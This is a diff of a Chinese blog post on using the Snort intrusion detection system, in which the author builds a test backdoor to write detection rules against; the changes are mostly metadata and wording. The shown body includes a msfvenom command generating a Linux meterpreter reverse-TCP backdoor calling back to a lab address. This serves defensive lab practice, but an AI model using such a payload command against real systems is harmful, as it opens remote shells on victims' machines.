@@ -7,19 +7,19 @@
 
 
 
-    <meta name="description" content="Snort是一个开源的网络入侵检测系统，根据官方文档简单地学习了一下使用方法之后试一下实战应用，实战对象就是我最近分析过的一个木马程序，分析文章在这里，根据分析结果写出响应的规则。 安装Snort 安装Snort的方法网上有教程，因此就不多说了，自认为最简单的方法就是apt-get。 Kali启动！ 用Kali Linux中的msfvenom生成一个后门程序： 1msfvenom -p linux">
+    <meta name="description" content="Snort是一个开源的网络入侵检测系统，根据官方文档简单地学习了一下使用方法之后试一下实战应用，实战对象就是我最近分析过的一个木马程序，分析文章在这里，根据分析结果写出响应的规则。 安装Snort 安装Snort的方法网上有教程，因此就不多说了，最简单的方法就是apt-get。 Kali启动！ 用Kali Linux中的msfvenom生成一个后门程序： 1msfvenom -p linux/x8">
 <meta name="keywords" content="Snort,IDS">
 <meta property="og:type" content="article">
 <meta property="og:title" content="开源网络入侵检测系统-Snort实战">
 <meta property="og:url" content="https://hvnt3r.top/2019/05/开源网络入侵检测系统-Snort实战/index.html">
 <meta property="og:site_name" content="Hvnt3r&#39;s Blog">
-<meta property="og:description" content="Snort是一个开源的网络入侵检测系统，根据官方文档简单地学习了一下使用方法之后试一下实战应用，实战对象就是我最近分析过的一个木马程序，分析文章在这里，根据分析结果写出响应的规则。 安装Snort 安装Snort的方法网上有教程，因此就不多说了，自认为最简单的方法就是apt-get。 Kali启动！ 用Kali Linux中的msfvenom生成一个后门程序： 1msfvenom -p linux">
+<meta property="og:description" content="Snort是一个开源的网络入侵检测系统，根据官方文档简单地学习了一下使用方法之后试一下实战应用，实战对象就是我最近分析过的一个木马程序，分析文章在这里，根据分析结果写出响应的规则。 安装Snort 安装Snort的方法网上有教程，因此就不多说了，最简单的方法就是apt-get。 Kali启动！ 用Kali Linux中的msfvenom生成一个后门程序： 1msfvenom -p linux/x8">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://hvnt3r.top/gallery/thumbnails/snort.png">
-<meta property="og:updated_time" content="2019-05-23T06:38:20.374Z">
+<meta property="og:updated_time" content="2019-05-23T07:00:35.305Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="开源网络入侵检测系统-Snort实战">
-<meta name="twitter:description" content="Snort是一个开源的网络入侵检测系统，根据官方文档简单地学习了一下使用方法之后试一下实战应用，实战对象就是我最近分析过的一个木马程序，分析文章在这里，根据分析结果写出响应的规则。 安装Snort 安装Snort的方法网上有教程，因此就不多说了，自认为最简单的方法就是apt-get。 Kali启动！ 用Kali Linux中的msfvenom生成一个后门程序： 1msfvenom -p linux">
+<meta name="twitter:description" content="Snort是一个开源的网络入侵检测系统，根据官方文档简单地学习了一下使用方法之后试一下实战应用，实战对象就是我最近分析过的一个木马程序，分析文章在这里，根据分析结果写出响应的规则。 安装Snort 安装Snort的方法网上有教程，因此就不多说了，最简单的方法就是apt-get。 Kali启动！ 用Kali Linux中的msfvenom生成一个后门程序： 1msfvenom -p linux/x8">
 <meta name="twitter:image" content="https://hvnt3r.top/gallery/thumbnails/snort.png">
 
 
@@ -168,7 +168,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    8 分钟 读完 (大约 1251 个字)
+                    8 分钟 读完 (大约 1248 个字)
                 </span>
                 
                 
@@ -183,7 +183,7 @@
         <div class="content">
             <p>Snort是一个开源的网络入侵检测系统，根据官方文档简单地学习了一下使用方法之后试一下实战应用，实战对象就是我最近分析过的一个木马程序，分析文章在<a href="https://hvnt3r.top/2019/05/%E6%9F%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">这里</a>，根据分析结果写出响应的规则。</p>
 <p><strong>安装Snort</strong></p>
-<p>安装Snort的方法网上有教程，因此就不多说了，自认为最简单的方法就是apt-get。</p>
+<p>安装Snort的方法网上有教程，因此就不多说了，最简单的方法就是apt-get。</p>
 <p>Kali启动！</p>
 <p>用Kali Linux中的msfvenom生成一个后门程序：</p>
 <figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.60.130 LPORT=6666 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
